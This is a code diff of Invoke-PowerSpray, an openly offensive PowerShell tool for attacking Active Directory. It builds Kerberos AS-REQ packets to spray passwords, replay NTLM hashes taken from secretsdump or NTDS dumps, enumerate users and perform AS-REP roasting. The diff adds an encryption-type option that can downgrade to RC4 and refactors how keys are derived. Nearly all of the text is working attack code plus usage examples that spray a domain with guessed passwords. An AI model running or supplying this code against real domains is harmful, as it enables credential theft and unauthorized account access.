@@ -3,7 +3,7 @@ function Invoke-PowerSpray {
 .SYNOPSIS
     Guess Active Directory credentials via Kerberos preauthentication.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
     Invoke-PowerSpray checks usernames and passwords (plain-text or NTLM hashes) by sending Kerberos AS-REQ.
@@ -26,6 +26,9 @@ function Invoke-PowerSpray {
 
 .PARAMETER DumpFile
     Specifies a dump file containing NTLM password hashes in the format <domain>\<username>:<uid>:<LM-hash>:<NT-hash>:<comment>:<homedir>: (e.g secretsdump's output).
+
+.PARAMETER EncType
+    Specifies the encryption type for Kerberos, defaults to 18 (AES256-CTS-HMAC-SHA1-96). When NTLM hash is used for authentication, it is downgraded to 23 (ARCFOUR-HMAC-MD5).
 
 .PARAMETER Domain
     Specifies the domain to build the AS-REQ for.
@@ -73,16 +76,16 @@ function Invoke-PowerSpray {
     PS C:\> Invoke-PowerSpray -UserFile .\users.lst -Server 192.168.1.10
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Ldap -Domain ADATUM.CORP -LdapUser simpleuser -LdapPass 'P@ssw0rd'
+    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -EncType 23 -Ldap -LdapUser simpleuser -LdapPass 'P@ssw0rd'
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Ldap -Domain ADATUM.CORP -Password 'Welcome2020' -BloodHound
+    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -Password 'Welcome2020' -Ldap -BloodHound
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -UserName testuser -Domain ADATUM.CORP -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
+    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -DumpFile .\contoso.ntds -Domain ADATUM.CORP -Threads 5
+    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -DumpFile .\contoso.ntds -Threads 5
 #>
 
     [CmdletBinding()]
@@ -128,6 +131,10 @@ function Invoke-PowerSpray {
         [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
         [String]
         $Hash,
+
+        [ValidateSet(1, 3, 17, 18, 23, 24)]
+        [Int]
+        $EncType = 18,
 
         [UInt32]
         $Delay = 0,
@@ -190,11 +197,23 @@ function Invoke-PowerSpray {
         $Domain = $rootDN -replace 'DC=' -replace ',','.'
     }
 
+    $pass = $null
+    if ($PSBoundParameters.ContainsKey('Password')) {
+        $pass = $Password
+    }
+
+    $nthash = $null
+    if ($PSBoundParameters.ContainsKey('Hash')) {
+        if($Hash -like "*:*") {
+            $nthash = $Hash.SubString(($Hash.IndexOf(":") + 1),32)
+        }
+        else {
+            $nthash = $Hash
+        }
+    }
+
     $ADSpath = "LDAP://$Server/$rootDN"
     $badPwdCount = -1
-    if($Hash -like "*:*") {
-        $Hash = $Hash.SubString(($Hash.IndexOf(":") + 1),32)
-    }
     $credentials = New-Object System.Collections.ArrayList
 
     if ($Username) {
@@ -206,7 +225,7 @@ function Invoke-PowerSpray {
             }
         }
         if ($badPwdCount -ne $null -or -not $Ldap) {
-            $cred = @{Username = $Username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
+            $cred = @{Username = $Username; Password = $pass; Hash = $nthash; BadPwdCount = $badPwdCount}
             $credentials.add($cred) | Out-Null
         }
     }
@@ -221,7 +240,7 @@ function Invoke-PowerSpray {
                 }
             }
             if ($badPwdCount -ne $null -or -not $Ldap) {
-                $cred = @{Username = $username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
+                $cred = @{Username = $username; Password = $pass; Hash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
@@ -244,7 +263,7 @@ function Invoke-PowerSpray {
                 }
                 if ($badPwdCount -ne $null -or -not $Ldap) {
                     $nthash = $dump[3]
-                    $cred = @{Username = $username; Password = $null; Hash = $nthash; BadPwdCount = $badPwdCount}
+                    $cred = @{Username = $username; Password = $pass; Hash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
                 }
             }
@@ -256,7 +275,7 @@ function Invoke-PowerSpray {
         foreach($userAccountControl in $disabledUserAccountControl) {
             $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
         }
-        if (-not ($Password -or $Hash)) {
+        if (-not ($pass -or $nthash)) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
             $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
@@ -267,7 +286,7 @@ function Invoke-PowerSpray {
             $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
         }
         ForEach ($user in $users) {
-            $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
+            $cred = @{Username = $user.samAccountName; Password = $pass; Hash = $nthash; BadPwdCount = $user.badPwdCount}
             $credentials.add($cred) | Out-Null
         }
     }
@@ -276,6 +295,7 @@ function Invoke-PowerSpray {
     }
 
     $params = @{
+        EncType = $EncType
         Domain = $Domain
         Server = $Server
         ADSpath = $ADSpath
@@ -306,11 +326,17 @@ function Local:New-KerberosSpray {
         [System.Collections.ArrayList]
         $Collection,
 
+        [Parameter(Mandatory = $True)]
         [String]
         $Domain,
 
+        [Parameter(Mandatory = $True)]
         [String]
         $Server,
+
+        [ValidateSet(1, 3, 17, 18, 23, 24)]
+        [Int]
+        $EncType,
 
         [UInt32]
         $Delay,
@@ -354,25 +380,17 @@ function Local:New-KerberosSpray {
             Write-Host "[!] Skipping $($cred.Username)@$Domain because its 'badPwdCount' is $($cred.badPwdCount) (> $LockoutThreshold)"
             continue
         }
-        elseif ($cred.Password) {
-            # Kerberos preauthentication using plain-text password (spraying)
-            # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
-            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Password $cred.Password -EncType 18 -Domain $Domain -Server $Server
+
+        if ($cred.Password -ne $null) {
+            $salt = "$($Domain.ToUpper())$($cred.Username)"
+            $keyBytes = KerberosPasswordHash -eType $EncType -Password $cred.Password -Salt $salt
         }
         elseif ($cred.Hash) {
-            # Kerberos preauthentication using NTLM hash / RC4 key (stuffing)
-            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Hash $cred.Hash -Domain $Domain -Server $Server
+            # ETYPE 23 = ARCFOUR-HMAC-MD5
+            $EncType = 23
+            $keyBytes = [byte[]] ($cred.Hash -replace '..', '0x$&,' -split ',' -ne '')
         }
-        elseif ($Ldap) {
-            # Kerberos preauthentication without credentials (roasting)
-            # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
-            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -EncType 23 -Domain $Domain -Server $Server
-        }
-        else {
-            # Kerberos preauthentication without credentials (enumeration)
-            # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
-            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -EncType 18 -Domain $Domain -Server $Server
-        }
+        $asn_AS_REP = New-KerbPreauth -EncType $EncType -UserName $cred.Username -Key $keyBytes -Domain $Domain -Server $Server
         $tag = $asn_AS_REP.TagValue
 
         # ERR_PREAUTH_REQUIRED
@@ -419,7 +437,7 @@ function Local:New-KerberosSpray {
                 24 {
                     $output = "$($cred.Username)@$($Domain) failed to authenticate"
                     $newBadPwdCount = $null
-                    if ($Ldap -And -Not $NoOldPwd) {
+                    if ($Ldap -and -not $NoOldPwd -and ($($cred.Username) -ne $LdapUser)) {
                         $filter = "(samAccountName=$($cred.Username))"
                         $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                     }
@@ -527,18 +545,14 @@ function Local:New-KerbPreauth {
         $Username,
 
         [Parameter(Mandatory = $False)]
-        [String]
-        $Password,
+        [Byte[]]
+        $Key,
 
-        [Parameter(Mandatory = $False)]
-        [ValidateScript({$_.Length -eq 32})]
-        [String]
-        $Hash,
-
-        [Parameter(Mandatory = $False)]
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
         [ValidateSet(1, 3, 17, 18, 23, 24)]
         [Int]
-        $EncType = 18,
+        $EncType,
 
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
@@ -555,21 +569,7 @@ function Local:New-KerbPreauth {
     $EndPoint = New-Object System.Net.IPEndPoint $Address, 88
     $Socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::TCP)
     $Socket.TTL = 128
-
-    if ($Password) {
-        $salt = "$($Domain.ToUpper())$($Username)"
-        $keyBytes = KerberosPasswordHash -eType $EncType -Password $Password -Salt $salt -Count 4096
-        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType -Key $keyBytes
-    }
-    elseif ($Hash) {
-        # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
-        $ntlmHashBytes = [byte[]] ($Hash -replace '..', '0x$&,' -split ',' -ne '')
-        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType 23 -Key $ntlmHashBytes
-    }
-    else {
-        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType
-    }
-
+    $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType -Key $Key
     $LengthBytes = [System.BitConverter]::GetBytes($ASREQ.Length)
     [Array]::Reverse($LengthBytes)
     $totalRequestBytes  = $LengthBytes + $ASREQ
@@ -608,7 +608,6 @@ function Local:New-ASReq {
         $EncType,
 
         [Parameter(Mandatory = $False)]
-        [ValidateNotNullOrEmpty()]
         [Byte[]]
         $Key
     )
@@ -753,19 +752,20 @@ function Local:New-ASReq {
 function Local:KerberosPasswordHash {
     [CmdletBinding()]
     param ( 
-        [parameter(Mandatory=$true)]
+        [parameter(Mandatory=$True)]
         [UInt32]
         $eType,
 
-        [parameter(Mandatory=$false)]
+        [parameter(Mandatory=$True)]
+        [AllowEmptyString()]
         [String]
         $Password,
 
-        [parameter(Mandatory=$true)]
+        [parameter(Mandatory=$True)]
         [String]
         $Salt,
 
-        [parameter(Mandatory=$true)]
+        [parameter(Mandatory=$False)]
         [int]
         $Count = 4096
     )
@@ -858,10 +858,13 @@ function Local:Get-LdapObject {
         [String]
         $ADSpath,
 
-        [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $Filter,
+        $SearchScope = 'Subtree',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Filter = '(objectClass=*)',
 
         [ValidateNotNullOrEmpty()]
         [String[]]
@@ -885,6 +888,7 @@ function Local:Get-LdapObject {
     else {
         $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
     }
+    $searcher.SearchScope = $SearchScope
     $searcher.PageSize = $PageSize
     $searcher.CacheResults = $false
     $searcher.filter = $Filter
@@ -1113,7 +1117,7 @@ using System.ComponentModel;
 using System.Runtime.InteropServices;
 
 public class Win32 {
-    [DllImport("cryptdll.Dll", CharSet = CharSet.Auto, SetLastError = false)]
+    [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
     public static extern int CDLocateCSystem(UInt32 type, out IntPtr pCheckSum);
 
     [StructLayout(LayoutKind.Sequential)]
